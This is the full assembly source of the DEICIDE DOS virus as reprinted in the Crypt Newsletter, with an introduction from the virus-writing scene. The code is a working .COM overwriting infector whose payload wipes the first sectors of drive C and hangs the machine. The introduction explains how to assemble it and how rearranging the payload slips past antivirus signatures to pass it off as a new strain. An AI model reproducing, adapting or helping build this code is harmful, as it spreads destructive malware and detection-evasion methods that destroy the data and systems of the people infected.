;***************************************************************************
; Source code of the DEICIDE Virus, original author: Glen Benton
; Assemble with A86 - Sanitized, English-ized and spruced up for inclusion
; in Crypt Newsletter #7.  The Crypt reader will also notice the
; DEICIDE listing has NO declarative red tape - no org's, no assume
; cs,ds,es stuff, no start/ends pairs or proc labels.  For the average
; reader, this means TASM and MASM will choke if you try to get them to
; assemble this as is. A86 doesn't need it, as Isaacson is fond of saying,
; and this listing can be assembled directly to a .COMfile
; without the need of a linker.
;
; DEICIDE virus is a kamikaze overwriting .COM infector, with a length 
; of 666 bytes in its original state. With A86, you get 665 bytes, which, we
; assume ruins, the 'aesthetics' of things just a bit. (Try adding a NOP
; to the listing if this bugs you too much.) Anyway, on call DEICIDE
; jumps right to the root directory where it looks for a any .COM file
; except COMMAND.COM to infect.
;
; If all files are infected, and DEICIDE is not on the C drive it attempts to 
; ruin it anyway. If all files in the root on C are infected, the fixed disk 
; is destroyed, a message displayed and the computer hung. 
; If a program is successfully overwritten, DEICIDE exits to DOS 
; after displaying 'File corruption error.' If DEICIDE is trapped on
; a diskette that is write-protected, it will generate noxious 'Abort,
; Retry, Ignore, Fail' messages.
;
; You can work with DEICIDE quite easily by commenting out the destructive
; sequence and reassembling. Then it will merely mess up .COM's in
; your root directory. If you forget that you're using NDOS or 4DOS, DEICIDE
; will promptly foul your command processor and the operating system
; won't load properly when you reboot. In an interesting side note, 
; removing the destructive payload of DEICIDE causes SCAN to lose sight of
; DEICIDE. (There's a simple poor man's method to a 'new' strain. Fool
; your friends who think you've written a virus from scratch.)
; The DEBUG script of DEICIDE has the destructive payload "rearranged" and
; is not, strictly speaking, identical to this listing. This has made
; that copy of DEICIDE (referred to in the scriptfile as DEICIDE2) 
; functionally similar to the original, but 
; still invisible to SCAN v85b and a number of other commercial products.
; The lesson to be learned here is that software developers shouldn't choose
; generic disk overwriting payloads as signatures for their scanners.
;
; I must confess I'm fascinated by the mind that went into creating DEICIDE.
; Even in 1990, the DEICIDE was more of a 'hard disk bomb' than a virus.
; Think a moment. How many files are in your root directory? How long before
; this sucker activated and spoiled your afternoon? Once? Twice? In
; any case, it still is an easily understood piece of code, enjoying its
; own unique charm. Enjoy looking at DEICIDE. Your virus pal, URNST KOUCH.
;***************************************************************************

Start_Prog:     jmp short Start_Virus
                nop

Message         db 0Dh,0Ah,'DEICIDE!'
                db 0Dh,0Ah
                db 0Dh,0Ah,'Glenn (666) says : BYE BYE HARDDISK!!'
                db 0Dh,0Ah
                db 0Dh,0Ah,'Next time be carufull with illegal stuff......$'

Start_Virus:    mov ah,19h                      ; Get actual drive
                int 21h

                db 0A2h                         ; Mov [EA],al
                dw offset Infect_Drive
                db 0A2h                     ; A86 assembles this differently
                dw offset Actual_Drive      ; so put the original code here

                mov ah,47h                 ; Get actual directory
                mov dl,0
                mov si,offset Actual_Dir
                int 21h

                mov ah,1Ah                 ; stash DTA in safe place
                mov dx,offset New_DTA
                int 21h

Infect_Next:    mov ah,3Bh                 ; DOS chdir function, go to root dir
                mov dx,offset Root_Dir
                int 21h

                mov ah,4Eh                 ; Search first .COM file
                mov cx,0
                mov dx,offset Search_Path  ; using file mask
                int 21h

Check_Command:  mov al,'D'         ; Check if 7th char is a 'D' (To prevent
                cmp [New_DTA+24h],al       ; infecting COMMAND.COM, causing 
                jnz Check_Infect           ; noticeable boot failure)
                jmp short Search_Next
                nop

Check_Infect:   mov ah,3Dh             ; Open found file with write access
                mov al,2
                mov dx,offset New_DTA+1Eh
                int 21h
                mov File_Handle,ax              ; Save handle
                mov bx,ax

                mov ah,57h                      ; Get date/time of file
                mov al,0                        ; why, for Heaven's sake?
                int 21h
                mov File_Date,dx
                mov File_Time,cx

                call Go_Beg_File                ; Go to beginning of file

                mov ah,3Fh                      ; Read first 2 bytes
                mov cx,2
                mov dx,offset Read_Buf          ; into a comparison buffer
                int 21h

                mov al,byte ptr [Read_Buf+1]   ; now, take a look at the
                cmp al,offset Start_Virus-102h ; buffer and the start of
                jnz Infect                     ; DEICIDE. Is it the
                                               ; jump? If not, infect file
                mov ah,3Eh                  ; Already infected, so close file
                int 21h

Search_Next:    mov ah,4Fh                  ; Search next file function
                int 21h
                jnc Check_Command           ; No error - try this file

                mov al,Infect_Drive         ; Skip to next drive,
                cmp al,0                     
                jnz No_A_Drive               
                inc al
No_A_Drive:     inc al
                cmp al,3                   ; Is the drive C:?
                jnz No_Destroy             ; 
                                           ; if it is and haven't been
                                           ; able to infect
                mov al,2                   ; Overwrite first 80 sectors, 
                mov bx,0                   ; BUMMER!
                mov cx,50h                 ; BUMMER!
                mov dx,0                   ; BUMMER!
                int 26h                    ; BUMMER!
                
                mov ah,9                   ; Show silly message 
                mov dx,offset Message
                int 21h
                

Lock_System:    jmp short Lock_System  ; lock up the system so the poor fool
                                     ; has to start reloading right away 
No_Destroy:     mov dl,al                          ; New actual drive
                mov ah,0Eh
                mov Infect_Drive,dl                ; Save drive number.
                int 21h

                jmp Infect_Next

Infect:         call Go_Beg_File          ;call seek routine

                mov ah,40h                ; Write DEICIDE to the file
                mov cx,offset End_Virus-100h  ;right over the top, starting
                mov dx,100h               ; at the beginning, thus messing
                int 21h                   ; up everything

                mov ah,57h                      ; Restore date/time of file
                mov al,1                        ; why, for God's sake? You 
                mov cx,File_Time                ; think no one will notice
                mov dx,File_Date                ; file is destroyed?
                int 21h

                mov ah,3Eh                       ; Close file, let's be neat
                int 21h

                mov dl,byte ptr [Actual_Drive]   ; Back to original drive
                mov ah,0Eh
                int 21h

                mov ah,3Bh                       ; And original dir
                mov dx,offset Actual_Dir
                int 21h

                mov ah,9                      ; Show 'File corruption error.'
                mov dx,offset Quit_Message    ; when destroyed, infected 
                int 21h                       ; program misfires and DEICIDE
                                          ; executes so user may be placated
                int 20h                   ; Exit back to DOS

Go_Beg_File:    mov ah,42h                ; Procedure: seek to start of file
                mov al,0
                mov cx,0
                mov dx,0
                int 21h
                ret


File_Date       dw (?)
File_Time       dw (?)

File_Handle     dw (?)

Infect_Drive    db (?)

Root_Dir        db '\',0

Search_Path     db '*.COM',0

Read_Buf        db 2 dup (?)

Actual_Drive    db (?)


Quit_Message    db 'File corruption error.',0Dh,0Ah,'$'

New_DTA         db 2Bh dup (?)

Actual_Dir      db 40h dup (?)

                db 'This experimental virus was written by Glenn Benton to '
                db 'see if I can make a virus while learning machinecode for '
                db '2,5 months. (C) 10-23-1990 by Glenn. I keep on going '
                db 'making virusses.'

End_Virus:

